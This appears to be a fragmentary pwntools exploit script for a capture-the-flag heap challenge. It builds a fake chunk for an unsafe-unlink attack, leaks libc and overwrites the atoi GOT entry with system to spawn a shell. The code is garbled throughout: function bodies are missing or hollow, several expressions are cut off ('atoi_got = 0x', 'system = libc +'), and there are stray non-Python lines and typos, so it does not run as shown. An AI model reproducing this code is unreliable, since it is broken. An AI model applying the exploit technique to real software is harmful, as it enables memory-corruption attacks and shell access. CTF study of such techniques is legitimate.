#!/usr/bin/env python
from pwn import *

def ad(size,name):
	r.recvuntil(":")
	r.sendline("2")
	r.sendline(str(size))
	r.recvuntil(":")
	r.sendline(name)

def show():
	
def change():
	str(index)
	name

def rm(index):
	str(index)

ad(0x80,"a") #0
ad(0x80,"a") #1
ad(0x80,"a") #2

#fake chunk
chunk = p64(0)+p64(0x81) #prev_size, size
chunk += p64(0x6020d8-0x18) + p64 -0x10  #fd, bk
chunk += "a"*0x60
chunk += p64(0x80) + p64(0x90)
change(1,0x100,chunk)
atoi_got = 0x
remove 2
change(1,0x100,p64(0)+p64(atoi_got))
show()
r.recvuntil("0 : ")
libc = u64(r.recvuntil("\n")[:-1].ljust(8,"\x00"))-0x36e80
print lubc
system = libc +
change(0,0x100,p64(system))

#atoi -> system
#read -> sh => system(sh)
#get a shell!!

#please use gdb to check
#and can help u learn
r.interactive()
